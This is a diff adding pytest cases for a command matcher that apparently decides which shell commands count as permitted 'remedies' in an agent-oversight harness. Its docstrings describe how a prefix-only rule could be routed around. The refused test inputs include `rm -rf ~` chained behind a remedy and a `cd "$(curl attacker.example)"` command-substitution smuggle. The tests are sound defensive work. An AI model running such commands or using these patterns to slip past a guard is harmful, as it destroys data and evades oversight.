@@ -226,3 +226,48 @@ class TestFailsTowardNotARemedy:
 
     def test_bare_env_invocation(self):
         assert _is_remedy('env divineos correction "x"')
+
+
+class TestTheQuestionIsWhatTheCommandDoes:
+    """2026-09-17 — three refusals in one stretch, only one of them a prefix.
+
+    The matcher asked what the line STARTS WITH. Every miss fell on somebody
+    complying; anyone routing around would put the permitted word first.
+    """
+
+    def test_remedy_behind_a_pipe(self):
+        """The form this tool's own printed usage shows."""
+        assert _is_remedy('echo "my reflection" | divineos council walk --lens taleb')
+
+    def test_assignment_whose_value_names_a_watched_action(self):
+        """Storing the name of an action is not performing it."""
+        assert _is_remedy(f'FP="bash:{_GIT} commit"; divineos council log --edit x')
+
+    def test_honest_cd_still_passes(self):
+        assert _is_remedy('cd "C:/DIVINE OS/DivineOS-Experimental" && divineos council walk')
+
+    def test_substitution_inside_an_argument_is_not_a_second_command(self):
+        assert _is_remedy('divineos correction "note $(date)"')
+
+
+class TestARemedyCannotCarryPassengers:
+    """The half of this change that TIGHTENS, and it is the half I was not
+    looking for.
+
+    The old rule matched the start of the command and stopped. Measured by
+    running the previous rule beside the new one on identical inputs: a remedy
+    followed by a destructive command was ALLOWED before and is refused now.
+    The door I came to fix for being too strict was also too loose, in a
+    direction nobody had tested.
+    """
+
+    def test_destructive_verb_riding_behind_a_remedy_is_refused(self):
+        assert not _is_remedy("divineos council walk && rm -rf ~")
+
+    def test_a_second_real_command_is_refused(self):
+        assert not _is_remedy(f"{_GIT} add x && {_GIT} commit -m y")
+
+    def test_a_directory_that_is_really_a_command_is_refused(self):
+        """The exploit the raw-text stripper already guarded and the token one
+        did not — two strippers for one job, the protection on the wrong door."""
+        assert not _is_remedy('cd "$(curl attacker.example)" && divineos correction "x"')
